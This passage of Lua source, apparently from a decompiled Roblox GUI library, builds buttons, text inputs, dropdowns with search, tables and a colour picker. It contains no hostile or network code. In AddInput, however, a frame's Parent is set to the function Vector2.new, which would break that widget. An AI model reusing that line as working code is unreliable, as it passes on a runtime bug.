		fn15(UIStroke, { Transparency = 0 }, 0.15)
	end)

	TextButton.MouseLeave:Connect(function()
		flag8 = false
		fn15(Frame2, { BackgroundTransparency = 0.4 }, 0.2)
		fn15(UIStroke, { Transparency = 0.4 }, 0.2)
	end)

	TextButton.MouseButton1Down:Connect(function()
		fn15(Frame2, { BackgroundTransparency = 0 }, 0.06)
		fn15(UIStroke, { Transparency = 0 }, 0.04)
	end)

	TextButton.MouseButton1Up:Connect(function()
		fn15(Frame2, { BackgroundTransparency = flag8 and 0.08 or 0.4 }, 0.1)
		fn15(UIStroke, { Transparency = flag8 and 0 or 0.4 }, 0.1)
	end)

	TextButton.MouseButton1Click:Connect(function()
		if tbl16.DoubleClick and not flag7 then
			flag7 = true
			TextButton.Text = "Are you sure?"

			task.delay(2, function()
				if flag7 then
					flag7 = false
					TextButton.Text = tbl16.Text or "Button"
				end
			end)

			return
		end

		flag7 = false
		TextButton.Text = tbl16.Text or "Button"
		fn19(tbl19.Func)
	end)

	tbl19.SetColor = function(arg3, backgroundColor3)
		color = backgroundColor3
		Frame2.BackgroundColor3 = backgroundColor3
		UIStroke.Color = backgroundColor3
	end

	tbl19.SetText = function(arg3, text)
		TextButton.Text = text
	end

	return tbl19
end

index3.AddInput = function(arg, arg2, arg3)
	local tbl16 = arg3 or {}
	local v18 = fn31(arg.Container)
	fn22(v18, tbl16)
	fn32(v18, tbl16.Text or "Input", theme.Title)

	if tbl16.Description then
		fn33(v18, tbl16.Description)
	end

	local Frame2 = fn17("Frame", {
		Name = "Textbox",
		Parent = Vector2.new,
		ZIndex = 2,
		BorderSizePixel = 0,
		BackgroundColor3 = theme.ElementBackground,
		AnchorPoint = Vector2.new(1, 0.5),
		AutomaticSize = Enum.AutomaticSize.X,
		Size = UDim2.new(0, 0, 1, -5),
		Position = UDim2.new(1, -8, 0.5, 0),
	})

	fn17("UICorner", { CornerRadius = UDim.new(0, 3), Parent = Frame2 })
	fn17("UIStroke", { Color = theme.TextboxStroke, ApplyStrokeMode = Enum.ApplyStrokeMode.Border, Parent = Frame2 })

	fn17("UIPadding", {
		PaddingTop = UDim.new(0, 5),
		PaddingRight = UDim.new(0, 5),
		PaddingLeft = UDim.new(0, 5),
		PaddingBottom = UDim.new(0, 5),
		Parent = Frame2,
	})

	local v19 = fn17

	local TextBox = v19("TextBox", {
		Parent = Frame2,
		BorderSizePixel = 0,
		TextSize = 12,
		TextColor3 = theme.TextboxText,
		PlaceholderColor3 = Color3.fromRGB(90, 90, 100),
		BackgroundTransparency = 1,
		FontFace = font,
		TextXAlignment = Enum.TextXAlignment.Left,
		AutomaticSize = Enum.AutomaticSize.XY,
		ClipsDescendants = true,
		AnchorPoint = Vector2.new(0, 0.5),
		Position = UDim2.new(0, 0, 0.5, 0),
		Size = UDim2.new(0, 0, 0, 0),
		ClearTextOnFocus = tbl16.ClearOnFocus == true,
		Text = tbl16.Default or "",
		PlaceholderText = tbl16.Placeholder or "Write Here..",
	})

	local tbl17

	tbl17 = {
		Type = "Input",
		Flag = arg2,
		Value = tbl16.Default or "",
		Callback = tbl16.Callback,
		SetValue = function(arg4, arg5, arg6)
			tbl17.Value = tostring(arg5)
			TextBox.Text = tbl17.Value

			if arg2 then
				tbl.Flags[arg2] = tbl17.Value
			end

			if not arg6 then
				fn19(tbl17.Callback, tbl17.Value)
			end
		end,
	}

	TextBox.FocusLost:Connect(function(enterPressed)
		if tbl16.EnterOnly and not enterPressed then
			TextBox.Text = tbl17.Value
			return
		end
		tbl17.Value = TextBox.Text

		if arg2 then
			tbl.Flags[arg2] = tbl17.Value
		end

		fn19(tbl17.Callback, tbl17.Value)
	end)

	if arg2 then
		tbl.Flags[arg2] = tbl17.Value
		tbl.Options[arg2] = tbl17
		fn13(tbl16.Text or "Input", "Input", arg2, arg)
	end

	return tbl17
end

index3.AddLabel = function(arg, arg2, arg3)
	local TextLabel = fn17("TextLabel", {
		Name = "Label",
		Parent = fn31(arg.Container),
		BorderSizePixel = 0,
		TextSize = 14,
		TextWrapped = true,
		TextXAlignment = Enum.TextXAlignment.Left,
		BackgroundTransparency = 1,
		FontFace = font,
		TextColor3 = arg3 or theme.SubText,
		AutomaticSize = Enum.AutomaticSize.Y,
		Size = UDim2.new(1, -20, 0, 0),
		Text = arg2 or "",
	})

	fn17("UIPadding", {
		PaddingTop = UDim.new(0, 7),
		PaddingLeft = UDim.new(0, 10),
		PaddingBottom = UDim.new(0, 3),
		Parent = TextLabel,
	})

	return {
		Type = "Label",
		Label = TextLabel,
		SetText = function(arg4, text)
			TextLabel.Text = text
		end,
		SetColor = function(arg4, textColor3)
			TextLabel.TextColor3 = textColor3
		end,
	}
end

index3.AddDivider = function(arg)
	local Frame2 = fn17("Frame", {
		Name = "LineHolder",
		Parent = arg.Container,
		BorderSizePixel = 0,
		BackgroundTransparency = 1,
		Size = UDim2.new(1, 0, 0, 5),
	})

	fn17("Frame", {
		Name = "Line",
		Parent = Frame2,
		BorderSizePixel = 0,
		BackgroundColor3 = theme.Line,
		AnchorPoint = Vector2.new(0.5, 0.5),
		Size = UDim2.new(1, -15, 0, 1),
		Position = UDim2.new(0.5, 0, 0.5, 0),
	})

	return Frame2
end

index3.AddDropdown = function(arg, arg2, arg3)
	local tbl16 = arg3 or {}
	local multi = tbl16.Multi or false
	local flag7 = tbl16.Description ~= nil
	local v18 = fn31(arg.Container, flag7 and nil or 40)

	if not flag7 then
		v18.AutomaticSize = Enum.AutomaticSize.None
	end

	fn22(v18, tbl16)
	local v19 = fn32(v18, tbl16.Text or "Dropdown", theme.Text)

	if flag7 then
		fn33(v18, tbl16.Description)
	end

	local Frame2 = fn17("Frame", {
		Name = "Dropdown",
		Parent = v18,
		ZIndex = 2,
		BorderSizePixel = 0,
		BackgroundColor3 = theme.ElementBackground,
		AnchorPoint = Vector2.new(1, 0.5),
		Size = UDim2.new(0, 180, 0, 28),
		Position = UDim2.new(1, -8, 0.5, 0),
	})

	fn17("UICorner", { CornerRadius = UDim.new(0, 5), Parent = Frame2 })

	fn17("UIStroke", {
		Color = theme.ElementStroke,
		Transparency = 0.3,
		ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
		Parent = Frame2,
	})

	fn20(Frame2, { Color = Color3.fromRGB(140, 140, 170), Size = 5, Transparency = 0.82, Offset = Vector2.new(0, 0) })

	local ImageLabel2 = fn17("ImageLabel", {
		Name = "DropdownArrows",
		Parent = Frame2,
		BorderSizePixel = 0,
		BackgroundTransparency = 1,
		ImageColor3 = theme.DropdownArrow,
		AnchorPoint = Vector2.new(1, 0.5),
		Image = tbl12.DropdownArrow,
		Size = UDim2.new(0, 11, 0, 11),
		Rotation = 90,
		Position = UDim2.new(1, -6, 0.5, 0),
	})

	local TextLabel = fn17("TextLabel", {
		Name = "IfDropdownBlank",
		Parent = Frame2,
		BorderSizePixel = 0,
		TextSize = 14,
		TextXAlignment = Enum.TextXAlignment.Left,
		BackgroundTransparency = 1,
		FontFace = font,
		TextColor3 = theme.DropdownBlank,
		Size = UDim2.new(1, -28, 1, 0),
		TextTruncate = Enum.TextTruncate.AtEnd,
		Text = "--",
		Position = UDim2.new(0, 8, 0, 0),
	})

	local TextButton = fn17("TextButton", { Parent = Frame2, Text = "", BackgroundTransparency = 1, Size = UDim2.new(1, 0, 1, 0), ZIndex = 3 })
	local tbl17 = { Type = "Dropdown", Flag = arg2, Values = tbl16.Values or {}, Multi = multi }
	tbl17.Value = multi and (type(tbl16.Default) == "table" and tbl16.Default or {}) or tbl16.Default
	tbl17.Callback = tbl16.Callback
	tbl17.Open = false
	local ScrollingFrame = nil
	local v20 = nil
	local TextButton2 = nil

	local function fn35()
		if multi then
			TextLabel.Text = #tbl17.Value > 0 and table.concat(tbl17.Value, ", ") or "--"
		else
			TextLabel.Text = tbl17.Value or "--"
		end
	end

	local function fn36(arg4)
		if multi then
			for _, v21 in ipairs(tbl17.Value) do
				if v21 == arg4 then
					return true
				end
			end

			return false
		end

		return tbl17.Value == arg4
	end

	local function fn37()
		if not tbl17.Open then
			return
		end
		tbl17.Open = false
		fn15(ImageLabel2, { ImageColor3 = theme.DropdownArrow }, 0.12)
		fn15(v19, { TextColor3 = theme.Text }, 0.12)

		if TextButton2 then
			TextButton2:Destroy()
			TextButton2 = nil
		end

		if ScrollingFrame then
			fn25(ScrollingFrame, v20)
			ScrollingFrame = nil
		end
	end

	fn30(fn37)

	local function fn38()
		tbl:CloseAllPopups()
		tbl17.Open = true
		fn15(ImageLabel2, { ImageColor3 = theme.AccentText }, 0.12)
		fn15(v19, { TextColor3 = theme.Title }, 0.12)

		TextButton2 = fn17("TextButton", {
			Name = "DropdownCatcher",
			Parent = arg.Window.Screen,
			Text = "",
			AutoButtonColor = false,
			BorderSizePixel = 0,
			BackgroundTransparency = 1,
			Size = UDim2.new(1, 0, 1, 0),
			ZIndex = 109,
		})

		TextButton2.MouseButton1Click:Connect(function()
			fn37()
		end)

		local n3 = #tbl17.Values
		local n4 = math.min(n3 * 28 + 14 + (n3 >= 8 and 32 or 0), 280)

		ScrollingFrame = fn17("ScrollingFrame", {
			Name = "OpenDropdown",
			Parent = arg.Window.Screen,
			Active = true,
			BorderSizePixel = 0,
			BackgroundColor3 = theme.ElementBackground,
			Size = UDim2.new(0, Frame2.AbsoluteSize.X, 0, n4),
			Position = UDim2.fromOffset(Frame2.AbsolutePosition.X + settings.DropdownMenuOffset.X, Frame2.AbsolutePosition.Y + Frame2.AbsoluteSize.Y + settings.DropdownMenuOffset.Y),
			CanvasSize = UDim2.new(0, 0, 0, 0),
			AutomaticCanvasSize = Enum.AutomaticSize.Y,
			ScrollBarThickness = 0,
			ScrollingDirection = Enum.ScrollingDirection.Y,
			ZIndex = 110,
		})

		fn17("UICorner", { CornerRadius = UDim.new(0, 5), Parent = ScrollingFrame })

		fn17("UIStroke", {
			Thickness = 1,
			Color = theme.ElementStroke,
			Transparency = 0.3,
			ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
			Parent = ScrollingFrame,
		})

		fn17("UIListLayout", { SortOrder = Enum.SortOrder.LayoutOrder, Parent = ScrollingFrame })
		fn17("UIPadding", { PaddingTop = UDim.new(0, 4), PaddingBottom = UDim.new(0, 4), Parent = ScrollingFrame })
		local TextBox = nil

		if n3 >= 8 then
			TextBox = fn17("TextBox", {
				Name = "Search",
				Parent = fn17("Frame", {
					Name = "SearchHolder",
					Parent = ScrollingFrame,
					LayoutOrder = 0,
					BorderSizePixel = 0,
					BackgroundTransparency = 1,
					Size = UDim2.new(1, 0, 0, 28),
					ZIndex = 111,
				}),
				BorderSizePixel = 0,
				TextSize = 12,
				BackgroundColor3 = theme.Panel,
				FontFace = font,
				TextColor3 = theme.TextboxText,
				PlaceholderColor3 = Color3.fromRGB(70, 70, 80),
				PlaceholderText = "Search...",
				Text = "",
				TextXAlignment = Enum.TextXAlignment.Left,
				AnchorPoint = Vector2.new(0.5, 0.5),
				Position = UDim2.fromScale(0.5, 0.5),
				Size = UDim2.new(1, -10, 0, 20),
				ClearTextOnFocus = false,
				ZIndex = 112,
			})

			fn17("UICorner", { CornerRadius = UDim.new(0, 3), Parent = TextBox })
			fn17("UIStroke", { Color = theme.Stroke, ApplyStrokeMode = Enum.ApplyStrokeMode.Border, Parent = TextBox })
			fn17("UIPadding", { PaddingLeft = UDim.new(0, 6), PaddingRight = UDim.new(0, 6), Parent = TextBox })
		end

		local tbl18 = {}
		local tbl19 = {}

		for _, value in ipairs(tbl17.Values) do
			local TextLabel2 = fn17("TextLabel", {
				Parent = ScrollingFrame,
				LayoutOrder = 1,
				BorderSizePixel = 0,
				TextSize = 14,
				TextXAlignment = Enum.TextXAlignment.Left,
				BackgroundTransparency = 1,
				FontFace = font,
				TextColor3 = fn36(value) and theme.AccentText or theme.Text,
				Size = UDim2.new(1, 0, 0, 28),
				Text = value,
				ZIndex = 111,
			})

			fn17("UIPadding", { PaddingLeft = UDim.new(0, 10), Parent = TextLabel2 })

			local TextButton3 = fn17("TextButton", {
				Parent = TextLabel2,
				Text = "",
				BackgroundColor3 = Color3.fromRGB(255, 255, 255),
				BackgroundTransparency = 1,
				Size = UDim2.new(1, 0, 1, 0),
				ZIndex = 112,
			})

			fn17("UICorner", { CornerRadius = UDim.new(0, 3), Parent = TextButton3 })

			local function fn39()
				if fn36(value) then
					fn15(TextLabel2, { TextColor3 = theme.AccentText }, 0.12)
				else
					fn15(TextLabel2, { TextColor3 = theme.Text }, 0.12)
				end
			end

			table.insert(tbl19, fn39)

			TextButton3.MouseEnter:Connect(function()
				fn15(TextButton3, { BackgroundTransparency = 0.85, BackgroundColor3 = theme.Accent:Lerp(Color3.new(1, 1, 1), 0.6) }, 0.08)
				fn15(TextLabel2, { TextColor3 = theme.AccentText }, 0.08)
			end)

			TextButton3.MouseLeave:Connect(function()
				fn15(TextButton3, { BackgroundTransparency = 1 }, 0.12)
				fn39()
			end)

			TextButton3.MouseButton1Click:Connect(function()
				if multi then
					if fn36(value) then
						for i, v21 in ipairs(tbl17.Value) do
							if v21 == value then
								table.remove(tbl17.Value, i)
								break
							end
						end
					else
						table.insert(tbl17.Value, value)
					end

					fn39()
					tbl.Flags[arg2] = tbl17.Value
					fn35()
					fn19(tbl17.Callback, tbl17.Value)
				else
					tbl17.Value = value
					tbl.Flags[arg2] = value

					for _, v21 in ipairs(tbl19) do
						v21()
					end

					fn35()
					fn19(tbl17.Callback, value)
				end
			end)

			table.insert(tbl18, { Frame = TextLabel2, Name = value })
		end

		if TextBox then
			TextBox:GetPropertyChangedSignal("Text"):Connect(function()
				local str4 = TextBox.Text:lower()

				for _, v21 in ipairs(tbl18) do
					v21.Frame.Visible = str4 == "" or v21.Name:lower():find(str4, 1, true) ~= nil
				end
			end)

			task.defer(function()
				if TextBox and TextBox.Parent then
					TextBox:CaptureFocus()
				end
			end)
		end

		v20 = fn24(ScrollingFrame)
	end

	TextButton.MouseButton1Click:Connect(function()
		if tbl17.Open then
			fn37()
		else
			fn38()
		end
	end)

	tbl17.SetValue = function(arg4, value, arg5)
		tbl17.Value = value
		tbl.Flags[arg2] = value
		fn35()

		if not arg5 then
			fn19(tbl17.Callback, value)
		end
	end

	tbl17.SetValues = function(arg4, values)
		tbl17.Values = values

		if tbl17.Open then
			fn37()
		end
	end

	if arg2 then
		tbl.Flags[arg2] = tbl17.Value
		tbl.Options[arg2] = tbl17
		fn13(tbl16.Text or "Dropdown", "Dropdown", arg2, arg)
	end

	fn35()
	return tbl17
end

index3.AddTable = function(arg, arg2, arg3)
	local tbl16 = arg3 or {}
	local columns = tbl16.Columns or {}
	local n3 = math.max(#columns, 1)
	local n4 = 1 / n3

	local Frame2 = fn17("Frame", {
		Name = "TableComponentsHolder",
		Parent = arg.Container,
		BorderSizePixel = 0,
		BackgroundTransparency = 1,
		AutomaticSize = Enum.AutomaticSize.Y,
		Size = UDim2.new(1, 0, 0, 0),
	})

	local TextLabel = fn17("TextLabel", {
		Name = "Title",
		Parent = Frame2,
		BorderSizePixel = 0,
		TextSize = 14,
		BackgroundTransparency = 1,
		FontFace = font,
		TextColor3 = theme.TableTitle,
		AutomaticSize = Enum.AutomaticSize.XY,
		Text = arg2 or "Table",
	})

	fn17("UIPadding", { PaddingLeft = UDim.new(0, 10), Parent = TextLabel })

	local Frame3 = fn17("Frame", {
		Name = "TableComponents",
		Parent = Frame2,
		BorderSizePixel = 0,
		BackgroundTransparency = 1,
		AnchorPoint = Vector2.new(0.5, 0),
		AutomaticSize = Enum.AutomaticSize.Y,
		Size = UDim2.new(1, -20, 0, 0),
		Position = UDim2.new(0.5, 0, 0, 20),
	})

	fn17("UIListLayout", { SortOrder = Enum.SortOrder.LayoutOrder, Parent = Frame3 })

	local function fn35(arg4)
		local Frame4 = fn17("Frame", { Parent = Frame3, BorderSizePixel = 0, BackgroundColor3 = arg4, Size = UDim2.new(1, 0, 0, 28) })

		fn17("UIListLayout", {
			SortOrder = Enum.SortOrder.LayoutOrder,
			FillDirection = Enum.FillDirection.Horizontal,
			Parent = Frame4,
		})

		return Frame4
	end

	local function fn36(arg4, arg5)
		local Frame4 = fn17("Frame", { Parent = arg4, BorderSizePixel = 0, BackgroundTransparency = 1, Size = UDim2.new(n4, 0, 1, 0) })

		fn17("UIStroke", {
			Thickness = 0.51,
			Color = theme.TableStroke,
			ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
			Parent = Frame4,
		})

		fn17("TextLabel", {
			Parent = Frame4,
			BorderSizePixel = 0,
			TextSize = 14,
			TextXAlignment = Enum.TextXAlignment.Left,
			BackgroundTransparency = 1,
			FontFace = font,
			TextColor3 = theme.TableText,
			Size = UDim2.new(1, 0, 1, 0),
			TextTruncate = Enum.TextTruncate.AtEnd,
			Text = arg5 or "",
		}, { fn17("UIPadding", { PaddingLeft = UDim.new(0, 8) }) })

		return Frame4
	end

	local v18 = fn35(theme.TableHeader)
	v18.Name = "Titles"

	for _, column in ipairs(columns) do
		fn36(v18, column)
	end

	local tbl17

	tbl17 = {
		Type = "Table",
		Rows = {},
		AddRow = function(arg4, arg5)
			local v19 = fn35(theme.TableRow)

			for i = 1, n3 do
				fn36(v19, arg5[i] and tostring(arg5[i]) or "")
			end

			table.insert(tbl17.Rows, v19)
			return v19
		end,
		Clear = function()
			for _, row in ipairs(tbl17.Rows) do
				row:Destroy()
			end

			tbl17.Rows = {}
		end,
		SetRows = function(arg4, arg5)
			tbl17:Clear()

			for _, v19 in ipairs(arg5) do
				tbl17:AddRow(v19)
			end
		end,
	}

	if tbl16.Rows then
		tbl17:SetRows(tbl16.Rows)
	end

	return tbl17
end

tbl.OpenColorPicker = function(arg, arg2, arg3)
	local window = tbl.Window
	tbl:CloseAllPopups()
	local value = arg2.Value

	if typeof(value) ~= "Color3" then
		value = Color3.fromRGB(255, 255, 255)
		arg2.Value = value
	end

	local color, n3, n4 = Color3.toHSV(value)

	local TextButton = fn17("TextButton", {
		Name = "DarkBG",
		Parent = window.Main,
		Text = "",
		AutoButtonColor = false,
		BorderSizePixel = 0,
		BackgroundColor3 = Color3.fromRGB(0, 0, 0),
		BackgroundTransparency = 0.65,
		Size = UDim2.new(1, 0, 1, 0),
		ZIndex = 120,
	})

	fn17("UICorner", { CornerRadius = UDim.new(0, 3), Parent = TextButton })

	local Frame2 = fn17("Frame", {
		Name = "ColorpickerHolder",
		Parent = window.Main,
		BorderSizePixel = 0,
		BackgroundColor3 = theme.Panel,
		AnchorPoint = Vector2.new(0.5, 0.5),
		Size = UDim2.new(0, 350, 0, 250),
		Position = UDim2.new(0.5, 0, 0.5, 0),
		ZIndex = 121,
	})

	fn17("UICorner", { CornerRadius = UDim.new(0, 4), Parent = Frame2 })
	fn17("UIStroke", { Color = theme.Stroke, ApplyStrokeMode = Enum.ApplyStrokeMode.Border, Parent = Frame2 })

	local Frame3 = fn17("Frame", {
		Name = "TopBar",
		Parent = Frame2,
		BorderSizePixel = 0,
		BackgroundColor3 = theme.Panel,
		Size = UDim2.new(1, 0, 0, 40),
		ZIndex = 121,
	})

	fn17("UICorner", { CornerRadius = UDim.new(0, 4), Parent = Frame3 })

	fn17("Frame", {
		Name = "Line",
		Parent = Frame3,
		BorderSizePixel = 0,
		BackgroundColor3 = theme.Stroke,
		Size = UDim2.new(1, 0, 0, 1),
		Position = UDim2.new(0, 0, 1, 0),
		ZIndex = 121,
	})

	local TextLabel = fn17("TextLabel", {
		Parent = Frame3,
		BorderSizePixel = 0,
		TextSize = 14,
		TextXAlignment = Enum.TextXAlignment.Left,
		BackgroundTransparency = 1,
		FontFace = font,
		TextColor3 = Color3.fromRGB(255, 255, 255),
		Size = UDim2.new(0, 150, 1, 0),
		Text = "Select Color",
		ZIndex = 122,
	})

	fn17("UIPadding", { PaddingLeft = UDim.new(0, 10), Parent = TextLabel })

	local ImageButton = fn17("ImageButton", {
		Parent = Frame3,
		BorderSizePixel = 0,
		AutoButtonColor = false,
		BackgroundTransparency = 1,
		ImageColor3 = theme.DimText,
		AnchorPoint = Vector2.new(1, 0.5),
		Image = tbl12.Close,
		Size = UDim2.new(0, 20, 0, 20),
		Position = UDim2.new(1, -10, 0.5, 0),
		ZIndex = 122,
	})

	local Frame4 = fn17("Frame", {
		Name = "ColorCanvas",
		Parent = Frame2,
		BorderSizePixel = 0,
		BackgroundColor3 = Color3.fromHSV(color, 1, 1),
		Size = UDim2.new(0, 155, 0, 150),
		Position = UDim2.new(0, 10, 0, 55),
		ZIndex = 121,
	})

	fn17("UICorner", { CornerRadius = UDim.new(0, 3), Parent = Frame4 })

	local Frame5 = fn17("Frame", {
		Name = "SaturationFrame",
		Parent = Frame4,
		BorderSizePixel = 0,
		BackgroundColor3 = Color3.fromRGB(255, 255, 255),
		Size = UDim2.new(1, 0, 1, 0),
		ZIndex = 121,
	})

	fn17("UIGradient", {
		Transparency = NumberSequence.new({ NumberSequenceKeypoint.new(0, 0), NumberSequenceKeypoint.new(1, 1) }),
		Parent = Frame5,
	})

	fn17("UICorner", { CornerRadius = UDim.new(0, 3), Parent = Frame5 })

	local Frame6 = fn17("Frame", {
		Name = "ValueFrame",
		Parent = Frame4,
		BorderSizePixel = 0,
		BackgroundColor3 = Color3.fromRGB(0, 0, 0),
		Size = UDim2.new(1, 0, 1, 0),
		ZIndex = 121,
	})

	fn17("UIGradient", {
		Rotation = 90,
		Transparency = NumberSequence.new({ NumberSequenceKeypoint.new(0, 1), NumberSequenceKeypoint.new(1, 0) }),
		Parent = Frame6,
	})

	fn17("UICorner", { CornerRadius = UDim.new(0, 3), Parent = Frame6 })

	local Frame7 = fn17("Frame", {
		Name = "PickerKnob",
		Parent = Frame4,
		BorderSizePixel = 0,
		BackgroundColor3 = Color3.fromRGB(255, 255, 255),
		BackgroundTransparency = 1,
		AnchorPoint = Vector2.new(0.5, 0.5),
		Size = UDim2.new(0, 8, 0, 8),
		Position = UDim2.new(n3, 0, 1 - n4, 0),
		ZIndex = 122,
	})

	fn17("UICorner", { CornerRadius = UDim.new(1, 0), Parent = Frame7 })
	fn17("UIStroke", { Color = Color3.fromRGB(255, 255, 255), Thickness = 1.5, Parent = Frame7 })

	local Frame8 = fn17("Frame", {
		Name = "HueBar",
		Parent = Frame2,
		BorderSizePixel = 0,
		BackgroundColor3 = Color3.fromRGB(255, 255, 255),
		Size = UDim2.new(0, 15, 0, 150),
		Position = UDim2.new(0, 175, 0, 55),
		ZIndex = 121,
	})

	fn17("UICorner", { CornerRadius = UDim.new(0, 3), Parent = Frame8 })
	local v18 = fn17
	local tbl16 = { Rotation = 90 }
	local colorSequence = ColorSequence.new
	local tbl17 = {}
	local v19 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0))
	local v20 = ColorSequenceKeypoint.new(0.17, Color3.fromRGB(255, 255, 0))
	local v21 = ColorSequenceKeypoint.new(0.33, Color3.fromRGB(0, 255, 0))
	local v22 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0, 255, 255))
	local v23 = ColorSequenceKeypoint.new(0.67, Color3.fromRGB(0, 0, 255))
	local v24 = ColorSequenceKeypoint.new(0.83, Color3.fromRGB(255, 0, 255))
	tbl17[1] = v19
	tbl17[2] = v20
	tbl17[3] = v21
	tbl17[4] = v22
	tbl17[5] = v23
	tbl17[6] = v24

	do
		local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 0, 0)))
		table.move(values, 1, values.n, 7, tbl17)
	end

	tbl16.Color = colorSequence(tbl17)
	tbl16.Parent = Frame8
	v18("UIGradient", tbl16)

	local Frame9 = fn17("Frame", {
		Name = "HueKnob",
		Parent = Frame8,
		BorderSizePixel = 0,
		BackgroundColor3 = Color3.fromRGB(255, 255, 255),
		AnchorPoint = Vector2.new(0.5, 0.5),
		Size = UDim2.new(1, 4, 0, 5),
		Position = UDim2.new(0.5, 0, color, 0),
		ZIndex = 122,
	})

	fn17("UICorner", { CornerRadius = UDim.new(1, 0), Parent = Frame9 })

	local Frame10 = fn17("Frame", {
		Name = "NewColorFrame",
		Parent = Frame2,
		BorderSizePixel = 0,
		BackgroundColor3 = value,
		Size = UDim2.new(0, 55, 0, 30),
		Position = UDim2.new(0, 205, 0, 71),
		ZIndex = 121,
	})

	fn17("UICorner", { CornerRadius = UDim.new(0, 3), Parent = Frame10 })
	fn17("UIStroke", { Color = theme.Stroke, Parent = Frame10 })

	fn17("TextLabel", {
		Parent = Frame10,
		BorderSizePixel = 0,
		TextSize = 14,
		BackgroundTransparency = 1,
		FontFace = font,
		TextColor3 = Color3.fromRGB(93, 93, 106),
		Size = UDim2.new(1, 0, 0, 10),
		AnchorPoint = Vector2.new(0, 1),
		Position = UDim2.new(0, 0, 0, -3),
		Text = "New",
		TextXAlignment = Enum.TextXAlignment.Left,
		ZIndex = 122,
	})

	local Frame11 = fn17("Frame", {
		Name = "CurrentColorFrame",
		Parent = Frame2,
		BorderSizePixel = 0,
		BackgroundColor3 = value,
		Size = UDim2.new(0, 55, 0, 30),
		Position = UDim2.new(0, 270, 0, 71),
		ZIndex = 121,
	})

	fn17("UICorner", { CornerRadius = UDim.new(0, 3), Parent = Frame11 })
	fn17("UIStroke", { Color = theme.Stroke, Parent = Frame11 })

	fn17("TextLabel", {
		Parent = Frame11,
		BorderSizePixel = 0,
		TextSize = 14,
		BackgroundTransparency = 1,
		FontFace = font,
		TextColor3 = Color3.fromRGB(93, 93, 106),
		Size = UDim2.new(1, 0, 0, 10),
		AnchorPoint = Vector2.new(0, 1),
		Position = UDim2.new(0, 0, 0, -3),
		Text = "Current",
		TextXAlignment = Enum.TextXAlignment.Left,
		ZIndex = 122,
	})

	local Frame12 = fn17("Frame", {
		Name = "SavedColorsHolder",
		Parent = Frame2,
		BorderSizePixel = 0,
		BackgroundTransparency = 1,
		Size = UDim2.new(0, 145, 0, 60),
		Position = UDim2.new(0, 200, 0, 130),
		ZIndex = 121,
	})

	fn17("TextLabel", {
		Parent = Frame12,
		BorderSizePixel = 0,
		TextSize = 14,
		BackgroundTransparency = 1,
		FontFace = font,
		TextColor3 = Color3.fromRGB(93, 93, 106),
		Size = UDim2.new(1, 0, 0, 12),
		Text = "Saved Colours",
		TextXAlignment = Enum.TextXAlignment.Left,
		ZIndex = 122,
	})

	local ScrollingFrame = fn17("ScrollingFrame", {
		Parent = Frame12,
		Active = true,
		BorderSizePixel = 0,
		BackgroundTransparency = 1,
		Size = UDim2.new(1, 0, 1, -18),
		Position = UDim2.new(0, 0, 0, 18),
		CanvasSize = UDim2.new(0, 0, 0, 0),
		AutomaticCanvasSize = Enum.AutomaticSize.X,
		ScrollingDirection = Enum.ScrollingDirection.X,
		ScrollBarThickness = 0,
		ZIndex = 121,
	})

	fn17("UIListLayout", {
		Padding = UDim.new(0, 5),
		SortOrder = Enum.SortOrder.LayoutOrder,
		FillDirection = Enum.FillDirection.Horizontal,
		VerticalAlignment = Enum.VerticalAlignment.Center,
		Parent = ScrollingFrame,
	})

	local function fn35()
		return Color3.fromHSV(color, n3, n4)
	end

	local function fn36()
		Frame4.BackgroundColor3 = Color3.fromHSV(color, 1, 1)
		fn15(Frame7, { Position = UDim2.new(n3, 0, 1 - n4, 0) }, 0.06, Enum.EasingStyle.Linear)
		fn15(Frame9, { Position = UDim2.new(0.5, 0, color, 0) }, 0.06, Enum.EasingStyle.Linear)
		Frame10.BackgroundColor3 = fn35()
		arg2.Value = fn35()
		arg3.BackgroundColor3 = arg2.Value

		if arg2.Flag then
			tbl.Flags[arg2.Flag] = arg2.Value
		end

		fn19(arg2.Callback, arg2.Value)
	end

	local Frame13 = fn17("Frame", {
		Name = "PlusIcon",
		Parent = ScrollingFrame,
		LayoutOrder = 0,
		BorderSizePixel = 0,
		BackgroundColor3 = theme.Panel,
		Size = UDim2.new(0, 17, 0, 17),
		ZIndex = 122,
	})

	fn17("UIStroke", { Color = theme.Stroke, Parent = Frame13 })
	fn17("UICorner", { CornerRadius = UDim.new(0, 3), Parent = Frame13 })

	local TextButton2 = fn17("TextButton", {
		Parent = Frame13,
		BorderSizePixel = 0,
		TextSize = 14,
		BackgroundTransparency = 1,
		FontFace = font,
		TextColor3 = theme.Text,
		Size = UDim2.new(1, 0, 1, 0),
		Text = "+",
		ZIndex = 123,
	})

	local function fn37(arg4)
		local Frame14 = fn17("Frame", {
			Parent = ScrollingFrame,
			LayoutOrder = #arg2.Saved,
			BorderSizePixel = 0,
			BackgroundColor3 = arg4,
			Size = UDim2.new(0, 17, 0, 17),
			ZIndex = 122,
		})

		fn17("UIStroke", { Color = theme.Stroke, Parent = Frame14 })
		fn17("UICorner", { CornerRadius = UDim.new(0, 3), Parent = Frame14 })

		fn17("TextButton", { Parent = Frame14, Text = "", BackgroundTransparency = 1, Size = UDim2.new(1, 0, 1, 0), ZIndex = 123 }).MouseButton1Click:Connect(function()
			if typeof(arg4) == "Color3" then
				local color2, v25, v26 = Color3.toHSV(arg4)
				color = color2
				n3 = v25
				n4 = v26
				fn36()
			end
		end)
	end

	for _, v25 in ipairs(arg2.Saved) do
		fn37(v25)
	end

	TextButton2.MouseButton1Click:Connect(function()
		table.insert(arg2.Saved, fn35())
		fn37(fn35())
	end)

	local function fn38(arg4, arg5, arg6, arg7)
		local Frame14 = fn17("Frame", {
			Parent = Frame2,
			BorderSizePixel = 0,
			BackgroundTransparency = 1,
			AnchorPoint = Vector2.new(1, 1),
			Size = UDim2.new(0, 65, 0, 25),
			Position = UDim2.new(1, arg5, 1, -10),
			ZIndex = 121,
		})

		fn17("UIStroke", { Color = theme.Stroke, ApplyStrokeMode = Enum.ApplyStrokeMode.Border, Parent = Frame14 })

		local TextButton3 = fn17("TextButton", {
			Parent = Frame14,
			BorderSizePixel = 0,
			TextSize = 14,
			AutoButtonColor = false,
